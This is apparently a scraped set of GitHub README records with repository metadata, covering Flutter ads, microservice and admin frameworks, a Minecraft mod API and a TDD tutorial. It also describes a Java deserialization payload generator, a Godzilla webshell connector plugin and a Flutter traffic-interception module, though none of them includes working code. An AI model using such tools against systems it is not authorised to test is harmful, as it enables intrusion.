  init().then((value) {
      if (value) {
         //广告初始化成功了执行的一些动作和方法
      }
  });
  
   Future<bool> init() async {
      try {
        //这个是广告的初始化事件
        bool result = await FlutterYouniGromore.init(
          ""广告id""
        );
        return result;
      } on PlatformException catch (e) {
      }
      return false;
    }
  ```
  
  ### 广告监听
  
  ```dart
  Future<void> setGromoreEvent() async {
      FlutterYouniGromore.onEventListener((event) {
        //event中最重要的两个属性是adId和action，adId就是广告位的id，action对应是广告位的行为
        //行为包括：广告错误、广告加载成功、广告填充、广告曝光、广告关闭（计时结束或者用户点击关闭）、广告点击、广告跳过、广告播放或计时完毕、获得广告激励 9个行为
        if (event is GromoreErrorEvent) {
        
        } else if (event is GromoreRewardEvent) {
   
        }
      });
    }
  ```
  
  下面是广告行为对应的名称：
  
  ```dart
  	///广告错误
    static const String onAdError = 'onAdError';
    ///广告加载成功
    static const String onAdLoaded = 'onAdLoaded';
    ///广告填充
    static const String onAdPresent = 'onAdPresent';
    ///广告曝光
    static const String onAdExposure = 'onAdExposure';
    ///广告关闭（计时结束或者用户点击关闭）
    static const String onAdClosed= 'onAdClosed';
    ///广告点击
    static const String onAdClicked = 'onAdClicked';
    ///广告跳过
    static const String onAdSkip = 'onAdSkip';
    ///广告播放或计时完毕
    static const String onAdComplete = 'onAdComplete';
    ///获得广告激励
    static const String onAdReward = 'onAdReward';
  ```
  
  下面是利用广告监听，展示完闪屏跳转到首页的示例代码
  
  ```dart
  Future<void> setAdEvent() async {
      FlutterYouniGromore.onEventListener((event) {
        if (event.adId == ""开屏广告位id"") {//先判断是开屏的广告广告位
          if (event.action == GromoreEventActions.onAdClosed ||
              event.action == GromoreEventActions.onAdSkip ||
              event.action == GromoreEventActions.onAdComplete ||
              event.action == GromoreEventActions.onAdError) {//判断各种的事件类型，符合这些条件的情况跳转到首页
            gotoMain();//跳转到首页
          }
        }
      });
    }
  ```
  
  ### 开屏广告
  
  ```dart
  Future<void> showSplash() async {
      try {
        bool result = await FlutterYouniGromore.showSplash(""广告位id"");
      } on PlatformException catch (e) {
      }
    }
  ```
  
  ### 插屏广告
  
  ```dart
   Future<void> showInterstitial() async {
      try {
        bool result = await FlutterYouniGromore.showInterstitial(""广告位id"");
      } on PlatformException catch (e) {
      }
    }
  ```
  
  ### 激励视频广告
  
  ```dart
    Future<void> showReward() async {
      if (!jumpCondition()) {
        return;
      }
      try {
        bool result = await FlutterYouniGromore.showReward(
           ""广告位id"",
        );
      } on PlatformException catch (e) {
      }
    }
  ```
  ### Banner(横幅)广告
  ```dart
   GromoreBannerWidget(
                  codeId: ""广告位id"",
                  width: 300,//广告的宽度
                  height: 150,//广告的高度
                ),
  ```
  
  
  
  
  
  





",Flutter的Gromore广告插件,,2024-04-13T08:22:20Z,2024-04-17T16:21:25Z,,0,1,0,4,1,16,129,1,0,MIT,Java
0ofo/Deswing,main,"# deswing

这是一个Java反序列化工具

集成ysoserial，一键生成并导出反序列化利用连payload。

![img_1.png](img/img_1.png)

推荐运行环境：Java1.8-Java11

经测试不支持 Java17+

v0.0.2版本更新，支持导出Base64和shiro550 payload
![img_1.png](img/img.png)",图形化Java反序列化利用工具，集成Ysoserial,,2024-04-20T16:22:23Z,2024-05-08T09:47:16Z,2024-05-08T09:47:16Z,2,1,0,5,0,9,126,1,0,,Java
jd-opensource/joylive-agent,main,"# joylive-agent

[![Build](https://github.com/jd-opensource/joylive-agent/actions/workflows/build.yml/badge.svg)](https://github.com/jd-opensource/joylive-agent/actions/workflows/build.yml)
![License](https://img.shields.io/github/license/jd-opensource/joylive-agent.svg)
[![Maven Central](https://img.shields.io/maven-central/v/com.jd.live/joylive-agent.svg?label=maven%20central)](https://search.maven.org/search?q=g:com.jd.live)
[![GitHub repo](https://img.shields.io/badge/GitHub-repo-blue)](https://github.com/jd-opensource/joylive-agent)
[![GitHub release](https://img.shields.io/github/release/jd-opensource/joylive-agent.svg)](https://github.com/jd-opensource/joylive-agent/releases)
[![Percentage of issues still open](http://isitmaintained.com/badge/open/jd-opensource/joylive-agent.svg)](http://isitmaintained.com/project/jd-opensource/joylive-agent ""Percentage of issues still open"")
[![Slack Status](https://img.shields.io/badge/slack-join_chat-white.svg?logo=slack&style=social)](https://joylivehq.slack.com)

<img src=""docs/image/weixin.png"" title=""The QR code is valid until 2024/7/8"" width=""150"" />

English | [简体中文](./README-zh.md)

## Overview

Service Governance Framework, supporting traditional microservice governance, swimlane governance, and multi-active (unit) traffic governance.
Following the traditional SDK governance model and Sidecar governance model, an exploration and implementation of the new generation Proxyless mode based on a microkernel extensible architecture, providing a high-performance, low-resource-consumption, cost-effective traffic governance framework for the enterprise Java ecosystem.

## Architecture
1. Agent for multi-live   
![pic](docs/image/architect-0.png)

2. Agent architect   
![pic](docs/image/architect-1.png)

3. Agent government theory   
![pic](docs/image/architect-2.png)

4. Agent for full chain gray release based on lane   
![pic](docs/image/architect-3.png)

5. Agent for local cell priority strategy   
![pic](docs/image/architect-4.png)

6. For more information, please refer to the [Architecture Manual](docs/architect.md).

## Related Projects

1. [joylive-injector](https://github.com/jd-opensource/joylive-injector), used for cloud-native scenario auto-injection of `joylive-agent`.

## How to use

### Requirements

Compile requirement: JDK 17+ and Maven 3.2.5+ 

Runtime requirement: JDK 8+

## Main Features

1. Supports traffic control for various models, including in-region multi-activity and cross-region multi-activity.
2. Support swimlane-based full-link gray scale, QPS and concurrent current limiting, label routing, load balancing and other microservice governance strategies;
3. Supports local cell priority and cross-cell fault-tolerance strategies.
4. Employs bytecode enhancement technology, which is non-intrusive to business code and minimally impacts business performance.
5. Adopts a microkernel architecture with strong class isolation, featuring an easy-to-use and simple extension and configuration system.

## Quick Start

View [Quick Start](./docs/quickstart.md)

## Configuration reference manual

View [Configuration Reference Manual](./docs/config.md)

## Usage Examples

View [Usage Examples](./docs/example.md)

## Q&A

View [Q&A](./docs/qa.md)

## Release History

View [Release History](./RELEASE.md)

## Roadmap

View [Roadmap](./docs/roadmap.md)
",Java bytecode enhancement framework for traffic governance in multi-live (unit) scenarios. 基于字节码增强的面向应用多活和单元化的微服务流量治理框架。,"active-active,agent,flowcontrol,proxyless,swimlane,multi-live,enhancement,microservice,mesh,governance",2024-04-25T01:08:49Z,2024-09-24T23:30:56Z,2024-09-23T05:25:42Z,4,13,21,726,16,17,119,6,3,Apache-2.0,Java
feiyuchuixue/sz-boot-parent,main,"<h1 align=""center"" style=""margin: 30px 0 30px; font-weight: bold;"">Sz-Admin</h1>
<h4 align=""center"">基于SpringBoot3、Vue3的轻量级脚手架</h4>
<p align=""center"">
<a href=""https://github.com/feiyuchuixue/sz-boot-parent/blob/main/LICENSE""><img src=""https://img.shields.io/badge/license-Apache_2.0-blue.svg""></a>
</p>

# 简介

> 接触了很多优秀的开源和闭源项目，在使用过程中也发现一些问题，不甘满足的我遂产生了想法：于是利用休息时间编写了一套后台管理系统，它**灵活、简洁、高效**，拥抱最新的技术，因此**Sz-Admin**便诞生了，也意为升职Admin，升职加薪节节高。

**[Sz Admin](https://szadmin.cn/)** ，一个基于 Spring Boot 3、Vue 3 和 Element-Plus 的开源中后台管理框架，致力于为您提供一个流畅、直观且功能强大的开发框架。它不仅融合了最新的技术趋势，而且通过精心设计，确保了系统的简洁性和高效，让使用者可以专注业务。



## 在线体验

- 官网地址：https://szadmin.cn
- 文档地址：https://szadmin.cn/md/Help/doc/start.html
- 预览地址：https://preview.szadmin.cn
- 代码仓库：
    - 前端：
      - **Github**：**[sz-admin](https://github.com/feiyuchuixue/sz-admin.git)**
      - **Gitee**：**[sz-admin](https://gitee.com/feiyuchuixue/sz-admin.git)**
    - 后端：
      - **Github**：**[sz-boot-parent](https://github.com/feiyuchuixue/sz-boot-parent.git)**
      - **Gitee**：**[sz-boot-parent](https://gitee.com/feiyuchuixue/sz-boot-parent.git)**
    - 部署：
      - **Github**：**[sz-deploy](https://github.com/feiyuchuixue/sz-deploy.git)**
      - **Gitee**：**[sz-deploy](https://gitee.com/feiyuchuixue/sz-deploy.git)**

## 系统要求

- JDK >= 21
- MySQL >= 8.0.34
- Maven >= 3.8
- Node >= 16.x

## 核心技术

- **SpringBoot 3.x：** 最新的Spring Boot版本，提供更优的性能和更丰富的特性。
- **Sa-Token**：一个轻量级 Java 权限认证框架，简化权限认证，保障应用的安全性。
- **Mybatis Flex**：一个优雅的 `MyBatis` 增强框架，它非常轻量、同时拥有极高的性能与灵活性。
- **Flyway**：`数据库版本控制`工具，确保数据库迁移的可靠性。
- **Knife4j**：一个为 `Swagger` 接口文档增强的工具，提供了更直观的 API 文档展示和更便捷的接口测试体验。
- **Minio**：一个开源的对象存储服务，提供高性能、分布式存储解决方案，兼容 S3 API。
- **HikariCP**：选择 `HikariCP` 作为 JDBC 连接池，提供快速且高效的数据库连接管理。

- **Vue 3.4**：采用 `Vue 3.4`，Vue.js 的最新稳定版本，提供更强的性能和更丰富的功能，构建响应式用户界面。
- **Vite 5**：使用 `Vite 5` 作为前端开发和构建工具，它利用现代浏览器的原生 ES 模块导入特性，提供了快速的冷启动和即时模块热更新。
- **TypeScript**：通过 `TypeScript` 的集成，引入静态类型检查，增强了代码的可维护性和可读性，提前避免潜在的错误。
- **Pinia**：状态管理采用 `Pinia`，这是 Vue 3 的解构式状态管理库，它简单、灵活且易于使用，优化了应用的状态管理。
- **Element-Plus**：一个基于 Vue 3 的组件库，提供了一系列高质量的 UI 组件，帮助开发者快速构建美观、功能完备的用户界面。

## 功能列表

- **账户管理**：负责管理系统用户的创建、配置及权限分配，确保用户身份的合法性和操作的合规性。
- **角色管理**：实现角色与权限的精细绑定，通过角色分配简化用户权限管理，提高系统安全性和灵活性。
- **菜单管理**：定制化系统导航结构，通过权限细分确保用户仅访问授权的操作界面，增强操作的直观性和可控性。
- **字典管理**：维护系统内静态数据字典，如配置项、枚举值等，以统一管理和优化数据的一致性。
- **参数管理**：动态调整系统运行参数，无需重启即可实时生效，提升系统响应速度和运维效率。
- **客户端管理**：监管客户端接入，确保客户端的合法性和安全性，维护系统的整体稳定性。
- **部门管理**：构建组织架构，通过树状结构展示，支持数据权限的层级化管理，加强信息的有序性和安全性。
- **代码生成器**：自动化生成前后端代码模板，支持CRUD操作，加速开发周期，提升开发效率。
- **WebSocket**：提供WebSocket支持。

## 系统美照

<table>
    <tr>
        <td><img alt=""登录页"" src=""https://minio.szadmin.cn/public/img/login.webp""/></td>
        <td><img alt=""home页"" src=""https://minio.szadmin.cn/public/img/home.webp""/></td>
    </tr>
    <tr>
        <td><img alt=""账户管理"" src=""https://minio.szadmin.cn/public/img/account.webp""/></td>
        <td><img alt=""角色管理"" src=""https://minio.szadmin.cn/public/img/role.webp""/></td>
    </tr>
    <tr>
        <td><img alt=""菜单管理"" src=""https://minio.szadmin.cn/public/img/menu.webp""/></td>
        <td><img alt=""字典管理"" src=""https://minio.szadmin.cn/public/img/dict.webp""/></td>
    </tr>
    <tr>
        <td><img alt=""配置管理"" src=""https://minio.szadmin.cn/public/img/config.webp""/></td>
        <td><img alt=""客户端管理"" src=""https://minio.szadmin.cn/public/img/client.webp""/></td>
    </tr>    
    <tr>
        <td><img alt=""部门管理"" src=""https://minio.szadmin.cn/public/img/dept.webp""/></td>
        <td><img alt=""代码预览"" src=""https://minio.szadmin.cn/public/img/gen-preview.webp""/></td>
    </tr>
    <tr>
        <td><img alt=""代码生成配置1"" src=""https://minio.szadmin.cn/public/img/gen-editor.webp""/></td>
        <td><img alt=""代码生成配置2"" src=""https://minio.szadmin.cn/public/img/gen-editor2.webp""/></td>
    </tr>
</table>

----

## 参与讨论

<img alt=""加入群聊"" src=""https://minio.szadmin.cn/public/img/wechat.webp""/>",Sz-Admin：一个开源RBAC中后台框架，专为现代应用设计。它结合了最新的技术栈，包括后端的Spring Boot 3、JDK 21、Mybatis Flex、Sa-Token、Knife4j和Flyway，以及前端的Vue 3、Vite5、TypeScript和Element Plus，致力于为您提供一个直观、流畅且功能强大的开发体验。,,2024-04-07T12:46:51Z,2024-09-19T13:32:34Z,2024-09-19T13:32:34Z,16,4,20,192,0,26,103,11,2,Apache-2.0,Java
yohanes/zygisk-reflutter,main,"# Zygisk-based reFlutter implementation

reFlutter is a handy tool for reverse engineering Flutter-based applications for both rooted and non-rooted Android. To use Reflutter, you must obtain your APK and replace libflutter.so, resign the APK and reinstall it.

The Zygisk module is designed to empower rooted Android users by simplifying the process. With the provided app, you can easily download `libflutter.so` from reFlutter project. The Zygisk module will then seamlessly replace `libflutter.so` at runtime, making the process straightforward and efficient.

Please note: set up your Proxy IP. Set your Burp Suite like you would set when using reFlutter (listen to `*:8083` and enable ""Support invisible proxying"").

## Requirements

Rooted Android with Magisk installed and Zygisk Enabled

## Installation

Download the ZIP file, and install it as Zygisk module. You can also do it from ADB:


```
adb push  zygiskreflutter_1.0.zip /sdcard/
adb shell su -c magisk --install-module /sdcard/zygiskreflutter_1.0.zip
adb reboot
```


Install the APK, then setup your proxy IP from ""Set Proxy Host"" menu.

Select the app that you want to *reFlutter*, click download library, once it is downloaded, you can enable the proxy feature.

You can now start the target app normally


Check adb log and filter it by ""ZygiskReflutter"" in case you found a problem
",Zygisk-based reFlutter ,,2024-04-08T16:11:14Z,2024-04-08T16:29:17Z,2024-04-08T16:29:17Z,1,1,0,2,1,19,87,1,0,GPL-3.0,Java
xsshim/GzWebsocket,main,"# 哥斯拉 Websocket型 webshell

## 注： 仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任

![image](https://github.com/xsshim/GzWebsocket/assets/24834308/138b8dae-ff81-4668-a3c4-df28a2c1411b)
",哥斯拉webshell管理工具的插件，用于连接websocket型webshell,,2024-04-16T02:02:54Z,2024-04-17T10:14:01Z,,0,1,0,3,2,15,83,1,0,,Java
HypixelDev/ModAPI,master,"# Hypixel Mod API

The Hypixel Mod API is an implementation of custom packets for communicating with the Hypixel Server via plugin
messages.

## Mod Distributions

Official downloads of the Hypixel Mod API can be found on [Modrinth](https://modrinth.com/mod/hypixel-mod-api).
To install the mod, simply download the JAR file and place it in your mods folder.

Currently, the Hypixel Mod API supports the following mod loaders and versions:

- [Fabric Latest](https://github.com/HypixelDev/FabricModAPI)
- [Forge 1.8.9](https://github.com/HypixelDev/ForgeModAPI)

If there is significant demand, support for additional versions and loaders may be considered.

## Developer Usage

It is recommended to read over the [FAQ](https://github.com/HypixelDev/ModAPI/wiki/FAQ) on the GitHub Wiki before implementing the Mod API.

For using the Mod API you will need to add it as a dependency to your project. This can be done via the public
Hypixel Maven repository.

```xml

<repository>
    <id>Hypixel</id>
    <url>https://repo.hypixel.net/repository/Hypixel/</url>
</repository>
```

This repo can also be used with Gradle.

```gradle
repositories {
    maven { url 'https://repo.hypixel.net/repository/Hypixel/' }
}
```

You can then include the dependency in your project.

```xml

<dependency>
    <groupId>net.hypixel</groupId>
    <artifactId>mod-api</artifactId>
    <version>1.0.1</version>
</dependency>
```

```gradle
dependencies {
    implementation 'net.hypixel:mod-api:1.0.1'
}
```

Depending on your chosen mod loader, you will need to also include the `hypixel-mod-api` as a required dependency. For
example in Fabric you would include the following in your `fabric.mod.json` file.

```json
{
  ""depends"": {
    ""hypixel-mod-api"": "">=1.0.1""
  }
}
```

## Example Usage

Once you have the API added to your project you can start using it. Below are examples of sending server-bound packets,
as well as receiving client-bound packets.

### Sending a Hypixel Packet

```java
public class Example {
    public void sendPacket() {
        HypixelModAPI.getInstance().sendPacket(new ServerboundPartyInfoPacket());
    }
}
```

### Registering a packet handler

```java

public class Example {
    public void registerPacketHandler() {
        HypixelModAPI.getInstance().createHandler(ClientboundLocationPacket.class, packet -> {
            packet.getServerName();
        });
    }
}
```

### Subscribing to a packet event

If you wish to receive a specific event packet, you will need to subscribe to the event. Once subscribed you can
register a packet handler as normal (see example above).

```java
public class Example {
    public void subscribeToPacketEvent() {
        HypixelModAPI.getInstance().subscribeToEventPacket(ClientboundLocationPacket.class);
    }
}
```

Registering for an event packet is only required one time during the Minecraft client lifecycle. You can register for
event packets at anytime, including in your mod initialization code before the player has connected.

The implementation of the Mod API will automatically notify the server of any registered events when receiving
the `ClientboundHelloPacket`.
",Hypixel Mod API for interfacing with the Hypixel Server via the Minecraft Plugin Message system.,hypixel,2024-04-07T13:30:21Z,2024-08-04T13:23:55Z,2024-07-31T10:41:13Z,10,11,23,50,0,10,80,3,0,MIT,Java
msbaek/vsa-tdd,main,"# Develop Application with VSA and TDD

- 유튜브 영상: [Vertical Slice 방식으로 GraphQL 어플리케이션을 TDD로 구현하기](https://www.youtube.com/watch?v=ASSp38BguWI&t=2s)
- 
<!-- TOC -->

* [Develop Application with VSA and TDD](#develop-application-with-vsa-and-tdd)
    * [개요](#개요)
    * [create project](#create-project)
        * [start.io](#startio)
        * [docker compose 설정](#docker-compose-설정)
        * [의존성 추가](#의존성-추가)
        * [Enable Graphql & disable boot autoconfigure log](#enable-graphql--disable-boot-autoconfigure-log)
        * [Add runtime graphql wiring configurer](#add-runtime-graphql-wiring-configurer)
    * [구현 시작](#구현-시작)
    * [도메인 클래스 추가](#도메인-클래스-추가)
        * [기능 요구 사항](#기능-요구-사항)
        * [정적 설계](#정적-설계)
    * [행위 추가하기 - 상품군 생성하기](#행위-추가하기---상품군-생성하기)
        * [Acceptance Test(인수 테스트) - Outer TDD](#acceptance-test인수-테스트---outer-tdd)
            * [add failing acceptance test](#add-failing-acceptance-test)
            * [make it work with dummy](#make-it-work-with-dummy)
        * [CreateGoodsCollection 구현 - Inner TDD](#creategoodscollection-구현---inner-tdd)
            * [add failing test - CreateGoodsCollectionTest#create_goods_collection_returns_newly_created_id](#add-failing-test---creategoodscollectiontestcreate_goods_collection_returns_newly_created_id)
            * [make it work](#make-it-work)
            * [Extract Delegate in-memory repository](#extract-delegate-in-memory-repository)
            * [Extract Repository Interface](#extract-repository-interface)
            * [move instance method from test to model](#move-instance-method-from-test-to-model)
        * [make acceptance test work using DI](#make-acceptance-test-work-using-di)
            * [add approvaltests using findById](#add-approvaltests-using-findbyid)
    * [행위 추가하기 - 상품군 조회하기](#행위-추가하기---상품군-조회하기)
        * [Acceptance Test(인수 테스트) - Outer TDD](#acceptance-test인수-테스트---outer-tdd-1)
            * [Query 스키마 추가하기](#query-스키마-추가하기)
            * [add acceptance test](#add-acceptance-test)
            * [make it work with dummy](#make-it-work-with-dummy-1)
        * [Inner TDD](#inner-tdd)
    * [Implement Persistence Layer](#implement-persistence-layer)
    * [Packaging](#packaging)
    * [얻은 점들](#얻은-점들)
        * [전체적인 흐름(Inner and outer feedback loops in TDD)](#전체적인-흐름inner-and-outer-feedback-loops-in-tdd)
        * [순수한 Repository(GoodsCollectionRepository)를 사용하는 잇점](#순수한-repositorygoodscollectionrepository를-사용하는-잇점)
        * [In Memory Repository를 이용해서 개발 후 부드럽게 영속 계층 구현하기](#in-memory-repository를-이용해서-개발-후-부드럽게-영속-계층-구현하기)
        * [ApprovalsTest](#approvalstest)
    * [참고자료](#참고자료)

<!-- TOC -->

## 개요

- [Vertical Slice Architecture](https://www.jimmybogard.com/vertical-slice-architecture/), GraphQL, Outside-in /
  Inside-out TDD를 사용한 Spring Boot Application 개발 예제
- Hexagonal vs Vertical Slice
    - Hexagonal
        - 방대한 코드베이스에서 많은 개발자들이 협업할 때 지도 역할
        - 수백명의 개발자. 이직도 잦음
        - 느리더라도 안전하게 가야했음
    - Vertical Slice
        - 서너명의 개발자들이 한가지 서비스를
        - Hexagonal은 과함
        - 수직조각. 계층이 아니라 기능별로 구현
        - 빠름
        - 하지만 정원 가꾸기를 하지 않으면 기술 부채
- TDD
    - 웹, DB를 사용하는 어플리케이션을 개발할 때 어떻게 TDD 하나
    - 늘 테스트 코드에서 구현을 한 후에 추출해서 모델(프로덕션) 코드로 옮김
        - [KentBeck/TDD-Tyrant: A sample Java client for Tokyo Tyrant, used to demonstrate test-driven development](https://github.com/KentBeck/TDD-Tyrant)
          카타(Kata)에서 배웠음
        - 내 깃헙 리포 중 [msbaek/learning-test](https://github.com/msbaek/learning-test)에서 새로운 기능을 TDD로 배운 것을 모으고 있음
    - 아주 자신 있을 때는 모델코드에서 구현하기도 함
    - mockito를 사용하지 않고 dummy, stub을
      사용([Test Doubles](https://msbaek.github.io/codetemplate/tdd-terms.html#test-doubles))
    - Test에 application service, repository, domain에 해당하는 로직을 모두 구현한 후 리팩터링(Extract Delegate, Move Instance Method 등)을
      통해
      적합한 객체(Application Service, Repository, Domain object 등)로 로직을 이동하는 방향으로 진행
    - List, HashMap, AtomicLong 등을 이용하는 InMemory Repository로 최대한 구현을 한 후 마지막에 JPA를 통해 영속 계층을 구현
- 따라 해 보실 분은 `try-yourself` 브랜치를 받아서 [도메인 클래스 추가](#도메인-클래스-추가)부터 진행하시면 됩니다.

## create project

### [start.io](https://start.spring.io/)

![img.png](start.io.png)

- Spring Data JPA SQL
- Spring for GraphQL WEB
- Spring Reactive Web WEB
- Docker Compose Support DEVELOPER TOOLS
- Spring Boot DevTools DEVELOPER TOOLS
- Spring Modulith DEVELOPER TOOLS
- Lombok DEVELOPER TOOLS
- MySQL Driver SQL

### docker compose 설정

- application.yaml에 다음 라인 쿠착

```yaml
spring:
  docker:
    compose:
      lifecycle-management: start_only # docker compose를 이용해서 mysql을 실행
      skip:
        in-tests: false # test 시에도 docker compose를 실행
```

- build.gradle
    - spring-boot-docker-compose의 의존성 타입을 developmentOnly에서 implementation로 변경
      `implementation 'org.springframework.boot:spring-boot-docker-compose`

### 의존성 추가

```gradle
    repositories {
	maven { url 'https://jitpack.io' } // 추가 for ktown4u-utils
        mavenCentral()
    }

    implementation 'com.graphql-java:graphql-java-extended-scalars:21.0'
    testImplementation 'com.approvaltests:approvaltests:23.0.1'
    testImplementation 'com.github.HMInternational:ktown4u-utils:v1.5.0'
```

### Enable Graphql & disable boot autoconfigure log

```yaml
spring:
  jpa:
    hibernate:
      ddl-auto: update
  docker:
    compose:
      lifecycle-management: start_only # docker compose를 이용해서 mysql을 실행
      skip:
        in-tests: false # test 시에도 docker compose를 실행
  graphql:
    graphiql:
      enabled: true # graphiql 활성화
logging:
  level:
    org.springframework.boot.autoconfigure.logging: ERROR
```

### Add runtime graphql wiring configurer

```java

@Bean
public RuntimeWiringConfigurer runtimeWiringConfigurer() {
    return wiringBuilder -> wiringBuilder
            .scalar(ExtendedScalars.GraphQLBigDecimal)
            .scalar(ExtendedScalars.DateTime)
            .scalar(ExtendedScalars.Date);
}
```

## 구현 시작

- **무엇을 제일 먼저 해 구현하고 싶은가 ?**
    - 뭔가 동작하는것을 보면서 개발하고 싶다
    - GraphiQL 브라우저로 호출해 보고 싶다

```graphql
# src/main/resources/graphql/schema.graphqls
type Query {
    hello: String
}
```

## 도메인 클래스 추가

- 구현의 시작은 요구사항을 이해하고 개발 명세를 작성하는 것으로 시작
- 이 예제의 요구사항은 다음과 같다

### 기능 요구 사항

- 상품군 생성 요청(Mutation)
    - input: 상품군 이름과 goodsId 목록
    - process:
        - goodsId 목록을 이용해서 Goods 목록을 얻고, 이를 이용해서 GoodsCollectionItem 목록을 생성
        - GoodsCollection을 생성하고 GoodsCollectionItem 목록을 GoodsCollection에 추가
        - 저장
        - 신규로 생성된 GoodsCollection의 id를 반환
- 상품군 조회 요청(Query)
    - input: 상품군 이름, Paging, Sort 관련된 정보
    - output: 조건에 맞는 결과

### 정적 설계

- 최초 **정적 설계**를 통해 도메인 클래스를 추가(엔터티, 값 객체)
    - GoodsCollection, GoodsCollectionItem, Goods
    - 클래스, 속성, 관계에 집중

```java
public record Goods(Long goodsNo, String goodsId, String barcode) {
}
```

```java

@Getter
public class GoodsCollection {
    private Long id;
    private String name;
    private Long createdBy;
    private LocalDateTime createdAt;
    private Long updatedBy;
    private LocalDateTime updatedAt;
    private List<GoodsCollectionItem> goodsCollectionItems = new ArrayList<>();
```

```java

@Getter
public class GoodsCollectionItem {
    private Long id;
    private Long goodsNo;
    private String goodsId;
    private String barcode;
    private GoodsCollection goodsCollection;
```

## 행위 추가하기 - 상품군 생성하기

- Service, Repository, Domain Service 등을 구현하고 Controller를 연동하고 싶은가 ?
- 이런 경우 Controller 구현 시 예기치 않은 문제로 미리 구현한 클래스들에 대단위 수정을 가해야 하는 경우를 종종 겪었다
- 여기서는 `Controller + Application Service`를 하나의 클래스로 구현하는 것으로 시작한다.
    - 후에 로직이 복잡해지거나, 중복이 일어나면
    - Application Service → Domain Object(Entity, Value, Domain Service 등)로 추출한다.
- 그 보다 먼저 **인수 테스트**를 작성하여 언제 TDD가 멈춰야 할 지 알 수 있도록 한다.
- [Double-Loop TDD](https://sammancoaching.org/learning_hours/bdd/double_loop_tdd.html)
  ![](https://sammancoaching.org/assets/images/double_loop.jpg)
- 전체적인 흐름은 위 그림과 같다
    - 실패하는 인수 테스트를 작성한다
    - dummy, stub 등을 이용해서 인수테스트를 통과시킴
    - Inner TDD를 수행
        - failing test 추가
        - make it work
        - refactor
    - Inner TDD로 필요한 객체들의 구현을 완료하면 인수 테스트에서 이 객체들을 사용해서 성공하는지 확인
- Repository Interface를 정의하고, Map 이용한 InMemory Repository를 구현해서 모든 기능을 구현하고, 마지막으로 JPA 매핑 등을 통해 영속 계층을 구현하는 흐름을 따른다.

### Acceptance Test(인수 테스트) - Outer TDD

#### add failing acceptance test

- 언제 요구되는 기능이 완료되었는지 알 수 있게 해 주는 인수 테스트 작성
    - 상품군 조회 기능이 더 쉽지만 많은 것을 필요로 함
    - 상품군 생성은 더 어려우나 필요한 것이 적음
- failing test 작성 - GoodsCollectionAcceptanceTest#create_goods_collection

```java

@AutoConfigureHttpGraphQlTester
@ApplicationModuleTest(webEnvironment = SpringBootTest.WebEnvironment.MOCK)
public class GoodsCollectionAcceptanceTest {
    @Autowired private HttpGraphQlTester graphQlTester;

    @Test
    public void create_goods_collection() throws Exception {
        String queryString = """"""
                mutation {
                    createGoodsCollection(request: {
                        name: ""Collection 1""
                        ids: [""GD00112296"", ""GD00112297"", ""9000000112298"", ""9000000112299""]
                    })
                }
                """""";

        Long result = request(queryString, ""createGoodsCollection"")
                .entity(Long.class)
                .get();
        assertThat(result).isGreaterThan(0L);
    }

    private GraphQlTester.Path request(String queryString, String requestName) {
        return this.graphQlTester
                .mutate()
                .build()
                .document(queryString)
                .execute()
                .path(requestName);
    }
}
```

#### make it work with dummy

- Mutation 스키마 추가하기

```graphql
type Query {
    sayHello(name: String): String!
}

type Mutation {
    createGoodsCollection(request: CreateGoodsCollectionRequest): ID!
}

input CreateGoodsCollectionRequest {
    name: String!
    ids: [String!]!
}
```

- CreateGoodsCollection Use Case

```java

@Slf4j
@RequiredArgsConstructor
@Transactional
@Controller
public class CreateGoodsCollection {
    @MutationMapping(""createGoodsCollection"")
    public Long createGoodsCollection(@Argument final CreateGoodsCollectionRequest request) {
        return 1L;
    }

    record CreateGoodsCollectionRequest(String name, List<String> ids) {
    }
}
```

- mockito를 이용할 수도 있지만 dummy([Test Doubles](https://msbaek.github.io/codetemplate/tdd-terms.html#test-doubles))를 이용한 편이
  훨씬 더 편하고, 빠른 것 같다.
    - 심지어 최근엔 copilot 등으로 인해 자동 완성이 엄청나다.
    - Dto, Domain 모델의 속성 등을 알려주고 json, sql 등을 만들어 달라고 하면 그런 데이터도 쉽게 만들어 준다

### CreateGoodsCollection 구현 - Inner TDD

#### add failing test - CreateGoodsCollectionTest#create_goods_collection_returns_newly_created_id

```java
class CreateGoodsCollectionTest {
    @Test
    void create_goods_collection_returns_newly_created_id() {
        Long newlyCreatedId = createGoodsCollection(
                new CreateGoodsCollection.CreateGoodsCollectionRequest(
                        ""Collection 1"",
                        List.of(""GD00112296"", ""GD00112297"", ""9000000112298"", ""9000000112299"")));
        assertThat(newlyCreatedId).isGreaterThan(0L);
        Approvals.verify(
                Neutralizer.localDateTime(
                        YamlPrinter.printWithExclusions(
                                findById(newlyCreatedId).get(), ""id"")
                )
        );
    }

    private Optional<GoodsCollection> findById(Long id) {
        throw new UnsupportedOperationException(""CreateGoodsCollectionTest::findById not implemented yet"");
    }

    private Long createGoodsCollection(CreateGoodsCollection.CreateGoodsCollectionRequest createGoodsCollectionRequest) {
        throw new UnsupportedOperationException(""CreateGoodsCollectionTest::createGoodsCollection not implemented yet"");
    }
}
```

- **별도의 협력객체(collaborator)를 사용하지 않고 최대한 테스트 클래스에서 필요한 모든 기능(findById, createGoodsCollection 등)을 구현**한다.
- 이후 테스트가 성공하면 적절한 객체로 기능을 이동시킨다

#### make it work

- 테스트 클래스에 모든 구현을 제공하여 성공시키기
- 테스트 클래스에 Application Service, Repository, Domain Object 등에 구현할 모든 기능을 직관적으로 구현
    - **리팩터링은 최대한 나중에. 하지만 꼭**

```java
class CreateGoodsCollectionTest {
    /**
     * 실제 DB에서 조회한 상품 정보를 담고 있는 Map
     * 순서도 유지함
     */
    private final Map<Long, Goods> goodsMap = List.of(
                    new Goods(112296L, ""GD00112296"", ""9000000112296""),
                    new Goods(112297L, ""GD00112297"", ""9000000112297""),
                    new Goods(112298L, ""GD00112298"", ""9000000112298""),
                    new Goods(112299L, ""GD00112299"", ""9000000112299""),
                    new Goods(112300L, ""GD00112300"", ""9000000112300""),
                    new Goods(112301L, ""GD00112301"", ""9000000112300""),
                    new Goods(112303L, ""GD00112303"", ""9000000112303""),
                    new Goods(112304L, ""GD00112304"", ""9000000112304""),
                    new Goods(112306L, ""GD00112306"", ""9000000112306""),
                    new Goods(112307L, ""GD00112307"", ""9000000112307""))
            .stream()
            .collect(toMap(Goods::goodsNo, Function.identity()));
    private final AtomicLong goodsCollectionId = new AtomicLong(1L);
    private Map<Long, GoodsCollection> goodsCollectionMap = new HashMap<>();

    @Test
    void create_goods_collection_returns_newly_created_id() {
        Long newlyCreatedId = createGoodsCollection(
